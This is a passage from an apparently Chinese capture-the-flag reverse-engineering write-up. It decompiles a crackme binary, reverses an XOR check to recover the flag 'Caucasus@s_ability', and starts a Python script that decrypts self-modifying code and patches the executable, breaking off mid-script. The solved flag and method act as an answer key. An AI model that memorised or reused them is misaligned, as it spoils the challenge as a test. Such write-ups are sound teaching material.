  v29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;.kcik re&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
  v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;etneserP&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;IAZ yb d&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;nA&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
  v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  strcpy(v20, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;);
  strcpy(Format, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%20s&amp;#34;&lt;/span&gt;);
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;;
  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;;
  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;;
  v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;;
  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;;
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;;
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
  v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
  v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;;
  v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;;
  v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
  v18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
  scanf(Format, Str);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( strlen(Str) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; )
  {
    printf(v20, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v25);
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;(Str[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v39 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (Str[i] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v39 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v43 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) )
    {
      printf(v20, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v25);
      exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    }
  }
  printf(v20, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v31);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; printf(v20, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v21);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;找到最后的判断条件 &lt;code&gt;v43 != *(&amp;amp;v1 + i)&lt;/code&gt;，而 v43 是通过一个异或来生成的，因此只需要通过 v1 数组和 v39 数组反向求解得到输入的 Str 即可。&lt;/p&gt;
&lt;p&gt;下面是求解代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]
xor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;H_gnisiR&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eppo&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!r&amp;#39;&lt;/span&gt;[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag)):
    print (chr(flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ord(xor[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;])), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print ()
&lt;span style=&#34;color:#75715e&#34;&gt;# Caucasus@s_ability&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;patch-smc&#34;&gt;patch SMC&lt;/h3&gt;
&lt;p&gt;将得到的字符串输入程序，发现需要通过第二个认证&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;When the five horns cross, the golden soldier THOUSER is born.
Presented by ZAIA

      $$$$$$$$$$$$$$  $$$$$$$$$     $$$$$$$    $$$$$$$$$$
      $$$$$$$$$$$$$$ $$$$$$$$$$$    $$$$$$$    $$$$$$$$$$$
     $$$$$$$$$$$$$$ $$$$$$$$$$$$$   $$$$$$$   $$$$$$$$$$$$$
            $$$$$$  $$$$$$ $$$$$$   $$$$$$$  $$$$$$0 $$$$$$
          $$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$0
       $$$$$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
     $$$$$$$$$$$$$$$$$$$             $$$$$                   $$$
   $$$$$$$$$$$$$$$$$$$$       $$$$$$  $$$  $$$$$$       $$$$$$$$$
 $$$$$$$$$$$$$$$$$$$$$         $$$$$$ $$0 $$$$$$         $$$$$$$$

Input the flag to hijack the ability of Hiden Intelligence:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在 &lt;code&gt;Strings window&lt;/code&gt; 中并没有找到 &lt;code&gt;Input the flag&lt;/code&gt; 的字符串，怀疑程序使用了 SMC。&lt;/p&gt;
&lt;h4 id=&#34;法一patch--方法同-hgame-fake&#34;&gt;法一（patch  方法同 HGAME FAKE）&lt;/h4&gt;
&lt;p&gt;SMC 可以手动 patch 或者使用动态调试 dump，这里先选择手动 patch&lt;/p&gt;
&lt;p&gt;在 ida 的汇编页面中浏览 &lt;code&gt;Data&lt;/code&gt; 部分，发现在 &lt;code&gt;0x10040164D&lt;/code&gt; 位置有一长串未被 ida 解析的二进制数据，推测这部分是被加密过的代码，按 &lt;code&gt;x&lt;/code&gt; 交叉引用找到加密的代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_100401A6C&lt;/span&gt;()
{
  sub_100401506(byte_10040164D, &lt;span style=&#34;color:#ae81ff&#34;&gt;1045&lt;/span&gt;i64, Str);
  sub_10040162B();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;))byte_10040164D)();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现先用一个函数调用了这段二进制数据，随后调用以这个地址为开头的函数。&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;sub_100401506&lt;/code&gt; 函数中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;BOOL &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_100401506&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a3)
{
  BOOL result; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  DWORD flOldProtect; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+28h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+2Ch] [rbp-4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;lpAddress; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+40h] [rbp+10h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+48h] [rbp+18h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+50h] [rbp+20h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  lpAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1; &lt;span style=&#34;color:#75715e&#34;&gt;// bytes
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2;        &lt;span style=&#34;color:#75715e&#34;&gt;// 1045
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a3;        &lt;span style=&#34;color:#75715e&#34;&gt;// Str
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( strlen(Str) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; )
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;VirtualProtect(lpAddress, v7, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40u&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flOldProtect) )
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v7; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)lpAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v8); &lt;span style=&#34;color:#75715e&#34;&gt;// 关键代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VirtualProtect(lpAddress, v7, flOldProtect, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;flOldProtect);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;result )
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;把关键代码美化一下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v7; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    lpAddress[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; v8[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// 关键代码
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现是通过一个异或做的加密，密钥就是第一步中输入的字符串。&lt;/p&gt;
&lt;p&gt;因此写一个python脚本来解密并生成patch文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;smc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F4&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x72&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;,    &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0FE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0B3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0FC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D3&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;,
 &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D1&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6B&lt;/span&gt;,   &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0CB&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A8&lt;/span&gt;,    &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; ,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x84&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ED&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;,
&lt;span style=&#34;color:#75715e&#34;&gt;# 中间部分省略&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0FC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A2&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2B&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x73&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9B&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x84&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C4&lt;/span&gt;,
&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F0&lt;/span&gt;,    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ,    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ,    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ,  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C3&lt;/span&gt;]

file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;patch.py&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Caucasus@s_ability&amp;#39;&lt;/span&gt;
title &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;file_path = &amp;#34;天津垓.exe&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fr = open(file_path, &amp;#34;rb&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fw = open(&amp;#39;modify_&amp;#39;+file_path, &amp;#34;wb&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;data = fr.read()
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fw.write(data)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fw.seek(0xc4d)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(title)

